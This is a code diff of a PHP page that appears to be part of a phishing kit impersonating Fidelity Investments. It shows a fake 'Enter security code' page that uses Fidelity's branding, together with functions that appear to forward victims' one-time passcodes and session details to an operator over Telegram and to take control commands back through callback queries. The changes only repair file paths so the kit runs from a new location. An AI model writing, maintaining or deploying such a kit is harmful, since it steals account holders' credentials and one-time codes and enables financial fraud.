@@ -2,7 +2,7 @@
 session_start();
 header('Content-Type: text/html; charset=UTF-8');
 
-include 'config.php';
+include __DIR__ . '/../config.php';
 
 function getUserIP() {
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
@@ -47,7 +47,7 @@ function setLoginStatus($sessionId, $status) {
 }
 
 function processTelegramUpdate($update) {
-    include __DIR__ . '/config.php';
+    include __DIR__ . '/../config.php';
     
     if ($update && isset($update['callback_query'])) {
         $cb = $update['callback_query'];
@@ -199,7 +199,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'status') {
 }
 
 function sendOtpToTelegram($otp, $userInfo) {
-    include 'config.php';
+    include __DIR__ . '/../config.php';
 
     $sessionId = getOrCreateSessionId();
     $userId = $_SESSION['fidelity_user_id'] ?? '';
@@ -322,7 +322,7 @@ if (isset($_SESSION['otp_submitted']) && $_SESSION['otp_submitted'] && !$startPe
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enter security code - Fidelity</title>
-<link rel="stylesheet" href="assets/fonts.css">
+<link rel="stylesheet" href="/assets/fonts.css">
 <style>
 * {
     box-sizing: border-box;
@@ -485,7 +485,7 @@ button:hover {
 <header class="pvdsms-header">
 <div class="pvdsms-header-logo">
 <a href="https://www.fidelity.com/">
-<img src="assets/Fidelity-wordmark.svg" alt="Fidelity Investments">
+<img src="/assets/Fidelity-wordmark.svg" alt="Fidelity Investments">
 </a>
 </div>
 <div class="pvdsms-header-links">
